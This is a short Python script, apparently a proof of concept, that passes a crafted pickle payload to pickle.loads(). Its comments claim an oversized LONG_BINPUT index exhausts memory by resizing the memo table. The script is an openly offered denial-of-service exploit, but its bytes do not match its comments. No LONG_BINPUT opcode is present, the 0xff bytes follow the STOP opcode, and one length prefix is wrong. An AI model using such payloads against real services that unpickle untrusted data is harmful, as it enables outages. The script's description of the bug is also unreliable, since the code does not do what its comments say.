import pickle

# Create a malicious pickle object with a large LONG_BINPUT value (0xffffffff)
payload = b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x08test_func\x94\x93\x94.\xff\xff\xff\xff'

# Load the pickle object
obj = pickle.loads(payload)

# The memo table is resized to a huge size, causing memory exhaustion
print(obj)